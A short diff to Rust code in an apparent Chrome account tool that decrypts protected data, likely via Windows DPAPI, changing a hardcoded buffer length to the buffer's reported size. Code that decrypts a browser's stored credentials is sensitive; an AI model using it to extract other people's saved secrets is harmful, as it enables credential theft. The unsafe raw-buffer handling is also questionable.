@@ -43,11 +43,14 @@ impl ChromeAccount {
                 0,
                 &mut data_out,
             );
+
             if succ_unprotect == 0 {
                 panic!("Failed to decrypt! Exiting!");
             }
 
-            String::from_raw_parts(data_out.pbData, 32,16)
+            let size = data_out.cbData as usize;
+
+            String::from_raw_parts(data_out.pbData, size, size)
         }
     }
 
